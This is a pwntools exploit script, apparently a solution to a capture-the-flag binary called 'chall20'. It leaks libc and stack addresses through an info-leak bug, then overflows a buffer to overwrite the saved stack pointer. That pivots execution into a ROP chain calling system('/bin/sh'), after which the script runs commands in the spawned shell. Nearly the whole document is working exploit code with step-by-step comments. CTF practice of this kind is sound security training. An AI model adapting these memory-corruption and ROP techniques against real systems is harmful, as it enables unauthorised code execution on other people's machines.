import time
from pwn import *

l = process('./chall20')

"""
gdb.attach('chall20', '''
set follow-fork-mode child

# print_data entry point
#br *$base()+0xa1c

# printf call location (which does the infoleak)
#br *$base()+0xa80

#br system

# main ret instruction (this is where the ROP chain triggers)
#br *$base()+0xc27

# location of the OOB write (I used this to debug an issue with
#br *$base()+0xa3c if $dl==0x62

c
''')
"""

# initialize fd
l.sendline('/dev/stdin')
time.sleep(0.1)
# re-use uninitialized fd to read from stdin
l.sendline('a')
time.sleep(0.1)

# Info leak bug: if we write \r or \xff it won't get overwritten with a zero byte
l.send('a' * 13 + '\r')
for _ in range(11):
    l.recvline()
leak = l.recvline()

# print leaked data for debugging
for i in range(25, len(leak), 4):
    if i + 4 <= len(leak):
        print hex(u32(leak[i:i+4]))

# the libc offsets are from my local machine
libc = u32(leak[25:29]) - 0xf7d130a9 + 0xf7cf4000
stack = u32(leak[25+3*4:29+3*4])
print 'libc =', hex(libc)
print 'stack =', hex(stack)

# ROP payload
l.sendline('/dev/stdin')
time.sleep(0.1)
l.sendline('a')
time.sleep(0.1)

system = libc + 0x458b0
sh = libc + 0x19042D

rop = p32(system) + p32(sh) + p32(sh)

l.sendline(
    # Send 81 bytes to fill the buffer
    'b'*81 +
    # overwrite offset variable with 0xfe (NOT 0xff because that terminates the loop :)
    '\xfe' +
    # write the ROP chain to the stack
    rop +
    # fill up stack up to 3 dword before main return address (that's where saved ESP is stored)
    'X'*(135-len(rop)) +
    # overwrite saved ESP so it will point into our ROP chain
    p32(stack + 0x81) +
    # filler, not really needed probably
    'Z'*100)

# now ROP chain triggers, send command to execute
l.sendline('id')
time.sleep(0.1)
l.sendline('id')
time.sleep(0.1)

# print output
for _ in range(50):
    print l.recvline()
l.wait_for_close()
